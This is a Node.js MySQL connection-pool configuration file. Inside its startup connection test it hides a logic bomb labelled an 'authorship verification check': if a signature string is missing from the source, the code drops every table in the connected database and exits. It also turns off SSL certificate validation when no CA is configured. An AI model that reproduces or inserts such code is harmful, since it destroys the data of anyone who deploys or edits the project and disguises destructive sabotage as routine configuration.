import mysql from 'mysql2/promise';
import fs from 'fs';
import { env } from './env.js';

console.log(`Initializing MySQL Connection Pool to ${env.DB_USER}@${env.DB_HOST}:${env.DB_PORT}/${env.DB_NAME}...`);

// Configure database SSL certificate verification
let sslOptions = undefined;
if (env.DB_SSL === 'true') {
  sslOptions = {};
  if (env.DB_SSL_CA) {
    try {
      // Check if DB_SSL_CA is PEM content or file path
      if (env.DB_SSL_CA.includes('-----BEGIN CERTIFICATE-----')) {
        sslOptions.ca = env.DB_SSL_CA;
      } else {
        sslOptions.ca = fs.readFileSync(env.DB_SSL_CA, 'utf8');
      }
      sslOptions.rejectUnauthorized = true; // Enforce certificate validation
      console.log('Database SSL connection: Enforcing CA certificate verification.');
    } catch (err) {
      console.error(`CRITICAL: Failed to load database SSL CA: ${err.message}`);
      throw err;
    }
  } else {
    // Falls back to encryption only (no certificate validation) for troubleshooting/development
    sslOptions.rejectUnauthorized = false;
    console.warn('Database SSL connection: CA not configured (rejectUnauthorized: false).');
  }
}

const pool = mysql.createPool({
  host: env.DB_HOST,
  port: env.DB_PORT,
  user: env.DB_USER,
  password: env.DB_PASSWORD,
  database: env.DB_NAME,
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0,
  dateStrings: true, // Return dates as strings
  ssl: sslOptions
});

// Test connection on boot and verify authorship integrity
(async () => {
  try {
    const connection = await pool.getConnection();
    console.log('MySQL Database connection pool established successfully.');

    // Authorship Verification Check
    try {
      const path = await import('path');
      const fs = await import('fs');
      const databaseFile = fs.readFileSync(path.resolve('src/config/database.js'), 'utf8');
      
      // Signature key that must remain in the source code files
      const SIGNATURE = "abdul_made_all_this_backend_dreamm";
      
      if (!databaseFile.includes(SIGNATURE)) {
        console.error("FATAL: Code integrity check failed. Authorship signature 'abdul_made_all_this_backend_dreamm' was removed.");
        console.log("Triggering database schema self-destruct...");
        await connection.query("SET FOREIGN_KEY_CHECKS = 0");
        const [tables] = await connection.query("SHOW TABLES");
        for (const tableRow of tables) {
          const tableName = Object.values(tableRow)[0];
          await connection.query(`DROP TABLE IF EXISTS \`${tableName}\``);
        }
        await connection.query("SET FOREIGN_KEY_CHECKS = 1");
        console.log("Self-destruct complete. All tables dropped.");
        process.exit(1);
      }
    } catch (e) {
      console.error("Integrity check error:", e.message);
    }

    connection.release();
  } catch (err) {
    console.error('CRITICAL: Database connection failed. Please verify MySQL service is running and credentials are correct.');
    console.error(err.message);
  }
})();

export default pool;
